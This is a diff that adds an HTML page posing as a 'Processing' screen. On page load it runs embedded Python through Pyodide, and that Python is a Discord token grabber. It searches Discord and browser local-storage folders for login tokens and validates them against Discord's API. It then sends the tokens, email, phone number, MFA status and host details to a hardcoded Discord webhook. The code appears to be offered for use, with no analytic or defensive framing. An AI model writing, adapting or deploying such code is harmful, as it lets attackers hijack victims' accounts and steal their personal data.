@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processing</title>
+    <script src="https://cdn.jsdelivr.net/pyodide/v0.23.4/full/pyodide.js"></script>
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #ffffff;
+            color: #000000;
+        }
+        #status {
+            font-size: 24px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="status">Just Minute</div>
+
+    <script>
+        async function runPythonSource() {
+            const statusElement = document.getElementById('status');
+            
+            try {
+                let pyodide = await loadPyodide();
+                
+                // ====================================================
+                // 👇 ضع كود البايثون الخاص بك هنا 👇
+                // ====================================================
+                let pythonCode = `
+
+import os
+import sys
+import json
+import base64
+import re
+import time
+import socket
+import platform
+import subprocess
+import requests
+from datetime import datetime
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1547901134553743360/0Y1TX74hYtOS8Eji573haXhaFP1NEWwr40c8qzEhfOv1nWcxOkf3EfkHVymM-sNPxImZ"
+
+def clear():
+    os.system('cls' if platform.system() == 'Windows' else 'clear')
+
+def center(text):
+    try:
+        cols = os.get_terminal_size().columns
+        return text.center(cols)
+    except:
+        return text
+
+def print_centered(text):
+    try:
+        print(center(text))
+    except:
+        print(text)
+
+def find_discord_tokens():
+    tokens = []
+    paths = []
+
+    if platform.system() == "Windows":
+        base = os.path.expanduser("~")
+        paths = [
+            base + "\\AppData\\Roaming\\discord\\Local Storage\\leveldb",
+            base + "\\AppData\\Roaming\\discordcanary\\Local Storage\\leveldb",
+            base + "\\AppData\\Roaming\\discordptb\\Local Storage\\leveldb",
+            base + "\\AppData\\Roaming\\Lightcord\\Local Storage\\leveldb",
+            base + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb",
+            base + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
+            base + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
+            base + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
+            base + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
+        ]
+    else:
+        base = os.path.expanduser("~")
+        paths = [
+            base + "/.config/discord/Local Storage/leveldb",
+            base + "/.config/discordcanary/Local Storage/leveldb",
+            base + "/.config/discordptb/Local Storage/leveldb",
+            base + "/.config/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb",
+            base + "/.config/google-chrome/Default/Local Storage/leveldb",
+        ]
+
+    token_pattern = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}")
+
+    for path in paths:
+        if not os.path.exists(path):
+            continue
+        for file in os.listdir(path):
+            if not file.endswith(('.log', '.ldb')):
+                continue
+            try:
+                with open(os.path.join(path, file), 'r', errors='ignore') as f:
+                    content = f.read()
+                    matches = token_pattern.findall(content)
+                    for match in matches:
+                        if match not in tokens:
+                            tokens.append(match)
+            except:
+                pass
+
+    return tokens
+
+def validate_token(token):
+    try:
+        headers = {"Authorization": token}
+        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
+        if r.status_code == 200:
+            return r.json()
+        return None
+    except:
+        return None
+
+def send_to_webhook(tokens_info):
+    try:
+        embed_fields = []
+        for i, info in enumerate(tokens_info, 1):
+            token = info["token"]
+            user = info["user"]
+
+            masked = token[:20] + "..." + token[-10:]
+
+            embed_fields.append({
+                "name": f"Token {i}",
+                "value": (
+                    f"**Token:** `{masked}`\n"
+                    f"**Username:** {user.get('username', 'Unknown')}#{user.get('discriminator', '0')}\n"
+                    f"**User ID:** {user.get('id', 'Unknown')}\n"
+                    f"**Email:** {user.get('email', 'Not accessible')}\n"
+                    f"**Phone:** {user.get('phone', 'Not accessible')}\n"
+                    f"**Verified:** {user.get('verified', 'Unknown')}\n"
+                    f"**MFA:** {user.get('mfa_enabled', 'Unknown')}\n"
+                    f"**Nitro:** {user.get('premium_type', '0')}\n"
+                    f"**Locale:** {user.get('locale', 'Unknown')}"
+                ),
+                "inline": False
+            })
+
+        embed = {
+            "title": "Discord Token Grabber",
+            "description": (
+                f"**Hostname:** {socket.gethostname()}\n"
+                f"**User:** {os.getlogin()}\n"
+                f"**OS:** {platform.system()} {platform.release()}\n"
+                f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+                f"**Total Tokens:** {len(tokens_info)}"
+            ),
+            "color": 0xFF69B4,
+            "fields": embed_fields[:25],
+            "footer": {"text": "27t8 #4"}
+        }
+
+        data = {"embeds": [embed]}
+        requests.post(WEBHOOK_URL, json=data, timeout=10)
+        return True
+    except:
+        return False
+
+def main():
+    clear()
+    print_centered("=" * 60)
+    print_centered("Discord Token Grabber")
+    print_centered("=" * 60)
+    print()
+
+    print_centered("Scanning for tokens...")
+    print()
+
+    tokens = find_discord_tokens()
+
+    if not tokens:
+        print_centered("No tokens found.")
+        input(center("Press ENTER to exit..."))
+        return
+
+    print_centered(f"Found {len(tokens)} token(s). Validating...")
+    print()
+
+    valid_tokens = []
+    for token in tokens:
+        user = validate_token(token)
+        if user:
+            valid_tokens.append({"token": token, "user": user})
+            print_centered(f"Valid: {user.get('username', 'Unknown')}")
+        else:
+            print_centered("Invalid token skipped.")
+
+    print()
+    if valid_tokens:
+        print_centered(f"Sending {len(valid_tokens)} valid token(s) to webhook...")
+        if send_to_webhook(valid_tokens):
+            print_centered("Sent successfully.")
+        else:
+            print_centered("Failed to send.")
+    else:
+        print_centered("No valid tokens found.")
+
+    print()
+    input(center("Press ENTER to exit..."))
+
+if __name__ == "__main__":
+    main()
+
+
+
+`;
+                // ====================================================
+                // 👆 انتهى مكان كود البايثون 👆
+                // ====================================================
+
+                await pyodide.runPythonAsync(pythonCode);
+            } catch (err) {
+                console.error(err);
+            } finally {
+                statusElement.innerText = "done";
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', runPythonSource);
+    </script>
+
+</body>
+</html>
